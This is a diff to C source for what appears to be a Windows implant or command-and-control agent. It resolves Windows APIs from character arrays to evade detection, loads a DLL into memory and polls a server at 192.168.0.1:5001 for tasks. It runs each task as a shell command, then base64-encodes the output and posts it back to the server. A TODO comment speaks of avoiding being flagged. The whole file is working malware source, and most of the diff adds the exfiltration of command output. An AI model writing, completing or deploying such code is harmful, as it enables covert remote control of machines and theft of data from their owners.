@@ -1,3 +1,6 @@
+// TODO: Using custom implementations of functionalities such as trimming and parsing is not okay as they can easily be flagged
+// TODO: Close the web handles
+
 #include "addresshunter.h"
 #include <winnt.h>
 
@@ -35,6 +38,7 @@ typedef int(WINAPI *MESSAGEBOXA)(HWND, LPCTSTR, LPCTSTR, UINT32);
 
 // crypt32.dll export
 typedef BOOL(WINAPI *CRYPTSTRINGTOBINARYA)(LPCSTR, DWORD, DWORD, BYTE*, DWORD*, DWORD*, DWORD*);
+typedef BOOL(WINAPI *CRYPTBINARYTOSTRINGA)(const BYTE*, DWORD, DWORD, LPSTR, DWORD*);
 
 typedef void* HINTERNET;
 typedef UINT64 INTERNET_PORT;
@@ -98,6 +102,7 @@ typedef struct API_ {
     UINT64 wprintf;
     UINT64 printf;
     UINT64 CryptStringToBinaryA;
+    UINT64 CryptBinaryToStringA;
     UINT64 StrToIntW;
     UINT64 snprintf;
 } API, *PAPI;
@@ -162,22 +167,19 @@ int myStrlenW(const WCHAR* s1)
     return s2 - s1;
 }
 
-void * myMemcpyW (void *dest, const void *src, size_t len)
+void myMemcpyW (void *dest, const void *src, size_t len)
 {
   wchar_t *d = dest;
   const wchar_t *s = src;
   while (len--)
     *d++ = *s++;
-  return dest;
 }
 
-wchar_t* myConcat(PAPI api, const wchar_t *s1, const wchar_t *s2)
+wchar_t* myConcatW(PAPI api, const wchar_t *s1, const wchar_t *s2)
 {
-    WCHAR format[] = {'%', 'd', '\n', 0};
     const size_t len1 = myStrlenW(s1);
     const size_t len2 = myStrlenW(s2);
     wchar_t* result = (wchar_t*)((MALLOC)api->malloc)(len1 + len2 + 1); // +1 for the null-terminator
-    // in real code you would check for errors in malloc here
     myMemcpyW(result, s1, len1);
     myMemcpyW(result + len1, s2, len2 + 1); // +1 to copy the null-terminator
     return result;
@@ -372,7 +374,7 @@ CHAR* GetRequest(PAPI api, WCHAR* wcServer, INTERNET_PORT port, WCHAR* wcPath)
     return NULL;
 }
 
-void PostRequest(PAPI api, WCHAR* server, INTERNET_PORT port, const WCHAR* endpoint, const CHAR* data) {
+void PostRequest(PAPI api, WCHAR* server, INTERNET_PORT port, const WCHAR* endpoint, CHAR* data) {
     LPSTR pszData = (LPSTR)data;
     BOOL bResults = FALSE;
 
@@ -825,9 +827,11 @@ HANDLE inject(PAPI api, LPVOID lpDll, DWORD dwDllSize) { //
     return hDllBase;
 }
 
-CHAR* myStrtok(CHAR* str, CHAR delim)
+CHAR* myStrtok(CHAR* str, CHAR delim, BOOL reset)
 {
     static DWORD index = 0;
+    if (reset)
+    { index=0; return NULL; }
     CHAR* token = {0};
     DWORD lenStr = myStrlenA(str);
     str += index;
@@ -847,9 +851,10 @@ CHAR* myStrtok(CHAR* str, CHAR delim)
 
 CHAR* myStartTrim(CHAR* str, CHAR trim)
 {
-    while (str[0] == trim)
-    { str++; }
-    return str;
+    CHAR* outStr = str;
+    while (outStr[0] == trim)
+    { outStr++; }
+    return outStr;
 }
 
 CHAR* myEndTrim(CHAR* str, CHAR trim)
@@ -866,33 +871,34 @@ CHAR* myEndTrim(CHAR* str, CHAR trim)
 
 CHAR* myTrim(CHAR* str, CHAR trim)
 {
-    str = myStartTrim(str, trim);
-    str = myEndTrim(str, trim);
-    return str;
+    CHAR* outStr = myStartTrim(str, trim);
+    outStr = myEndTrim(outStr, trim);
+    return outStr;
 }
 
-CHAR* parseJsonTask(PAPI api, CHAR* json, CHAR** taskId, CHAR** uuid) {
+CHAR* myTrimB(PAPI api, CHAR* str, CHAR trim)
+{
+    CHAR* outStr = myStartTrim(str, trim);
+    outStr = myEndTrim(outStr, trim);
+    return outStr;
+}
+
+CHAR* readJsonTask(PAPI api, CHAR* json, CHAR** taskId, CHAR** uuid) {
+    CHAR* tmpJson = json;  // myStrtok modifies the string itself
     CHAR* task;
     CHAR delim = {'\n'};
-    CHAR* token = myStrtok(json, delim);
+    CHAR* token = myStrtok(tmpJson, delim, FALSE);
     CHAR blacklist[] = {'[', ']', '\0'};
 
     // SKIP [ and ]
     for (int i=0; i<=myStrlenA(blacklist)-1; i++)
     {
-        //((PRINTF)api->printf)("out\n");
-        //((PRINTF)api->printf)("%d\n", myStrlenA(token)-1);
         for (int j=0; j<=myStrlenA(token)-1; j++)
         {
-            //((PRINTF)api->printf)("in\n");
-            //((PRINTF)api->printf)("testing %c:%c\n", token[j], blacklist[i]);
             if (token[j] == blacklist[i])
             {
-                //((PRINTF)api->printf)("changing\n");
-                //taskId = myTrim(api, myStrtok(api, json, delim), ',');      // get task id
-                token = myStrtok(json, delim);
+                token = myStrtok(tmpJson, delim, FALSE);
                 i=-1;
-                //((PRINTF)api->printf)("broke\n");
                 break;
             }
         }
@@ -901,15 +907,30 @@ CHAR* parseJsonTask(PAPI api, CHAR* json, CHAR** taskId, CHAR** uuid) {
     // dont look
     *taskId = myTrim(token, ' ');
     *taskId = myEndTrim(*taskId, ',');
-    task = myTrim(myStrtok(json, delim), ' ');
+    task = myTrim(myStrtok(tmpJson, delim, FALSE), ' ');
     task = myEndTrim(task, ',');
     task = myTrim(task, '"');
-    *uuid = myTrim(myStrtok(json, delim), ' ');
+    *uuid = myTrim(myStrtok(tmpJson, delim, FALSE), ' ');
     *uuid = myEndTrim(*uuid, ',');
     *uuid = myTrim(*uuid, '"');
 
+    myStrtok(NULL, NULL, TRUE);
     return task;
 }
+
+/*
+VOID escapeBackslashes(CCHAR *input, CHAR *output) {
+    int j = 0; // Index for output
+    for (int i = 0; input[i] != '\0'; i++) {
+        if (input[i] == '\\') {
+            output[j++] = '\\'; // Add an extra backslash
+        }
+        output[j] = input[i]; // Copy the current character
+        j++;
+    }
+    output[j] = '\0'; // Null-terminate the output string
+}
+*/
 
 void messagebox() {
     API Api = { 0 };
@@ -949,6 +970,7 @@ void messagebox() {
     CHAR createThread_c[] = {'C', 'r', 'e', 'a', 't', 'e', 'T', 'h', 'r', 'e', 'a', 'd', 0};
     CHAR waitForSingleObject_c[] = {'W', 'a', 'i', 't', 'F', 'o', 'r', 'S', 'i', 'n', 'g', 'l', 'e', 'O', 'b', 'j', 'e', 'c', 't', 0};
     CHAR CryptStringToBinaryA_c[] = {'C', 'r', 'y', 'p', 't', 'S', 't', 'r', 'i', 'n', 'g', 'T', 'o', 'B', 'i', 'n', 'a', 'r', 'y', 'A', 0};
+    CHAR CryptBinaryToStringA_c[] = {'C', 'r', 'y', 'p', 't', 'B', 'i', 'n', 'a', 'r', 'y', 'T', 'o', 'S', 't', 'r', 'i', 'n', 'g', 'A', 0};
     CHAR StrToIntW_c[] = {'S', 't', 'r', 'T', 'o', 'I', 'n', 't', 'W', 0};
     CHAR closeHandle_c[] = {'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 0};
     CHAR sleep_c[] = {'S', 'l', 'e', 'e', 'p', 0};
@@ -997,6 +1019,7 @@ void messagebox() {
 
     // crypt32
     api->CryptStringToBinaryA = GetSymbolAddress((HANDLE)crypt32dll, CryptStringToBinaryA_c);
+    api->CryptBinaryToStringA = GetSymbolAddress((HANDLE)crypt32dll, CryptBinaryToStringA_c);
 
     // shlwapi
     api->StrToIntW = GetSymbolAddress((HANDLE)shlwapidll, StrToIntW_c);
@@ -1021,7 +1044,7 @@ void messagebox() {
     PESG_STD_API PEsgStdApi = &EsgStdApi;
 
     //((PRINTF)api->printf)("Raw dll size: %d\n", dwDllSize);
-    pEsgStdDll =  inject(api, pEsgStdDll, dwDllSize);
+    pEsgStdDll = inject(api, pEsgStdDll, dwDllSize);
 
     CHAR runCmd_c[] = {'R', 'u', 'n', 'C', 'm', 'd', 0};
 
@@ -1029,8 +1052,10 @@ void messagebox() {
 
     WCHAR wServer[] = {'1', '9', '2', '.', '1', '6', '8', '.', '0', '.', '1', 0};
     WCHAR tasksPath[] = {'/', 't', 'a', 's', 'k', 's', '/', 0};
+    WCHAR sendOutputPath[] = {'/', 's', 'e', 'n', 'd', '_', 't', 'a', 's', 'k', '_', 'o', 'u', 't', 'p', 'u', 't', '/', 0};
     WCHAR uuid[] = {'1', '1', 'e', '3', 'b', '2', '7', 'c', '-', 'a', '1', 'e', '7', '-', '4', '2', '2', '4', '-', 'b', '4', 'd', '9', '-', '3', 'a', 'f', '3', '6', 'f', 'a', '2', 'f', '0', 'd', '0', 0};
-    WCHAR* fullPath = myConcat(api, tasksPath, uuid);
+    WCHAR* fullPath = myConcatW(api, tasksPath, uuid);
+    WCHAR* fullPath2;
     INTERNET_PORT port = 5001;
 
     CHAR* jsonResponse;
@@ -1038,41 +1063,126 @@ void messagebox() {
     CHAR* agentUuid = {0};
     CHAR* task;
     CHAR* taskOutput;
+    CHAR* b64EncodedOutput;
+    DWORD b64EncodedOutputSize;
     DWORD sizeOfOutput;
     CHAR jsonFormat[] = {
-    '{', '"', 't', 'a', 's', 'k', '_', 'i', 'd', '"', ':', ' ', '%', 's', ',', 
-    ' ', '"', 'a', 'g', 'e', 'n', 't', '_', 'u', 'u', 'i', 'd', '"', ':', ' ', '"', 
-    '%', 's', '"', ',', ' ', '"', 't', 'a', 's', 'k', '_', 'o', 'u', 't', 'p', 
-    'u', 't', '"', ':', ' ', '"', '%', 's', '"', '}', '\0'
+    '{', '"', 't', 'a', 's', 'k', '_', 'i', 'd', '"', ':', ' ', '"', '%', 's', '"', ',',
+    ' ', '"', 'a', 'g', 'e', 'n', 't', '_', 'u', 'u', 'i', 'd', '"', ':', ' ', '"',
+    '%', 's', '"', ',', ' ', '"', 't', 'a', 's', 'k', '_', 'o', 'u', 't', 'p',
+    'u', 't', '"', ':', ' ', '"', '%', 's', '"', '}'
     };
-    WCHAR sendOutputPath[] = {'/', 's', 'e', 'n', 'd', '_', 't', 'a', 's', 'k', '_', 'o', 'u', 't', 'p', 'u', 't', '/', 0};
     DWORD totalJsonSize;
     CHAR* json;
+    CHAR exit[] = {'e', 'x', 'i', 't', 0};
 
     while (TRUE)
     {
+        ((PRINTF)api->printf)("\nzxcv");
         jsonResponse = GetRequest(api, wServer, port, fullPath);
 
         if (jsonResponse == NULL)
         {
-            ((SLEEP)api->Sleep)(5000);
+            ((PRINTF)api->printf)("Nothing");
+
+            ((SLEEP)api->Sleep)(3000);
             continue;
         }
-        task = parseJsonTask(api, jsonResponse, &taskId, &agentUuid);
+        /*
+        ((PRINTF)api->printf)("check");
+        ((PRINTF)api->printf)("%s", jsonResponse);
+        ((PRINTF)api->printf)("%p", api);
+        if (jsonResponse==NULL)
+        { ((PRINTF)api->printf)("jsonResponse"); }
+        if (api==NULL)
+        { ((PRINTF)api->printf)("api"); }
+        if (taskId==NULL)
+        { ((PRINTF)api->printf)("taskId"); }
+        if (agentUuid==NULL)
+        { ((PRINTF)api->printf)("agentUuid"); }
+        */
 
-        taskOutput = myTrim(((RUNCMD)PEsgStdApi->RunCmd)(task, &sizeOfOutput), '\n');
-        totalJsonSize = myStrlenA(jsonFormat) + sizeOfOutput + myStrlenA(taskId) + myStrlenA(agentUuid);
+        task = readJsonTask(api, jsonResponse, &taskId, &agentUuid);
+        ((PRINTF)api->printf)("%s", task);
+        //((PRINTF)api->printf)("%s", readJsonTask(api, jsonResponse, &taskId, &agentUuid));
+        //task = "dir";
+        taskOutput = myTrimB(api, ((RUNCMD)PEsgStdApi->RunCmd)(task, &sizeOfOutput), '\n');
+
+        ((PRINTF)api->printf)("%s", taskOutput);
+        ((CRYPTBINARYTOSTRINGA)api->CryptBinaryToStringA)((BYTE*)taskOutput, myStrlenA(taskOutput)+1, CRYPT_STRING_BASE64+CRYPT_STRING_NOCRLF, NULL, &b64EncodedOutputSize);
+        b64EncodedOutput = (CHAR*)((CALLOC)api->calloc)(b64EncodedOutputSize, sizeof(CHAR));
+        ((CRYPTBINARYTOSTRINGA)api->CryptBinaryToStringA)((BYTE*)taskOutput, myStrlenA(taskOutput)+1, CRYPT_STRING_BASE64+CRYPT_STRING_NOCRLF, b64EncodedOutput, &b64EncodedOutputSize);
+
+        /*
+        ((PRINTF)api->printf)("\nb63EncodedOutputSize: %d\n", b64EncodedOutputSize);
+        ((PRINTF)api->printf)("\njsonFormatSize: %d\n", myStrlenA(jsonFormat));
+        ((PRINTF)api->printf)("\ntaskIdSize: %d\n", myStrlenA(taskId));
+        ((PRINTF)api->printf)("\nagentUuidSize: %d\n", myStrlenA(agentUuid));
+        */
+
+        totalJsonSize = myStrlenA(jsonFormat)-6 + b64EncodedOutputSize + myStrlenA(taskId) + myStrlenA(agentUuid);
+        ((PRINTF)api->printf)("\ntotalJsonSize: %d\n", totalJsonSize);
+        json = (CHAR*)((CALLOC)api->calloc)(totalJsonSize, sizeof(CHAR));
+        ((SNPRINTF)api->snprintf)(json, totalJsonSize, jsonFormat, taskId, agentUuid, b64EncodedOutput);
+        //fullPath2 = myConcatW(api, sendOutputPath, uuid);
+        WCHAR fullPath2[] = {'/', 's', 'e', 'n', 'd', '_', 't', 'a', 's', 'k', '_', 'o', 'u', 't', 'p', 'u', 't', '/','1', '1', 'e', '3', 'b', '2', '7', 'c', '-', 'a', '1', 'e', '7', '-', '4', '2', '2', '4', '-', 'b', '4', 'd', '9', '-', '3', 'a', 'f', '3', '6', 'f', 'a', '2', 'f', '0', 'd', '0', 0};
+        PostRequest(api, wServer, port, fullPath2, json);
+        //((PRINTF)api->printf)(json);
+
+        if (taskOutput) {
+            ((FREE)api->free)(taskOutput);
+        }
+        if (b64EncodedOutput) {
+            ((FREE)api->free)(b64EncodedOutput);
+        }
+        if (json) {
+            ((FREE)api->free)(json);
+        }
+
+        /*
+        // Calculate the size of b64 encoded output
+        ((CRYPTBINARYTOSTRINGA)api->CryptBinaryToStringA)((BYTE*)taskOutput, myStrlenA(taskOutput)+1, CRYPT_STRING_BASE64+CRYPT_STRING_NOCRLF, NULL, &b64EncodedOutputSize);
+        b64EncodedOutput = (CHAR*)((CALLOC)api->calloc)(b64EncodedOutputSize, sizeof(CHAR));
+        ((PRINTF)api->printf)("%s", b64EncodedOutput);
+        // Then fire it
+        ((CRYPTBINARYTOSTRINGA)api->CryptBinaryToStringA)((BYTE*)taskOutput, myStrlenA(taskOutput)+1, CRYPT_STRING_BASE64+CRYPT_STRING_NOCRLF, b64EncodedOutput, &b64EncodedOutputSize);
+
+        //escapeBackslashes(taskOutput, escapedTaskOutput);
+
+        totalJsonSize = myStrlenA(jsonFormat)+1 + b64EncodedOutputSize+1 + myStrlenA(taskId)+1 + myStrlenA(agentUuid)+1;
         json = (CHAR*)((CALLOC)api->calloc)(totalJsonSize, sizeof(CHAR));
 
+        //((SNPRINTF)api->snprintf)(json, totalJsonSize*sizeof(CHAR), jsonFormat, taskId, agentUuid, b64EncodedOutput);
+        ((SNPRINTF)api->snprintf)(json, totalJsonSize, jsonFormat, taskId, agentUuid, b64EncodedOutput);
 
-        int written = ((SNPRINTF)api->snprintf)(json, totalJsonSize*sizeof(CHAR), jsonFormat, taskId, agentUuid, taskOutput);
         PostRequest(api, wServer, port, myConcat(api, sendOutputPath, uuid), json);
 
-        ((FREE)api->free)(taskOutput);
-        ((FREE)api->free)(json);
-        ((FREE)api->free)(jsonResponse);
+        ((PRINTF)api->printf)("1");
+        if (taskOutput) {
+            ((FREE)api->free)(taskOutput);
+        }
+        ((PRINTF)api->printf)("2");
+        if (b64EncodedOutput) {
+            ((FREE)api->free)(b64EncodedOutput);
+        }
+        ((PRINTF)api->printf)("3");
+        if (json) {
+            ((FREE)api->free)(json);
+        }
+        ((PRINTF)api->printf)("4");
+        if (jsonResponse) {
+            ((FREE)api->free)(jsonResponse);
+        }
+        ((PRINTF)api->printf)("5");
+        */
 
-        ((SLEEP)api->Sleep)(5000);
+        ((SLEEP)api->Sleep)(3000);
+        ((PRINTF)api->printf)("asdf");
     }
+    if (fullPath) {
+        ((PRINTF)api->printf)("free fullpath");
+        ((FREE)api->free)(fullPath);
+    }
+
 }
 
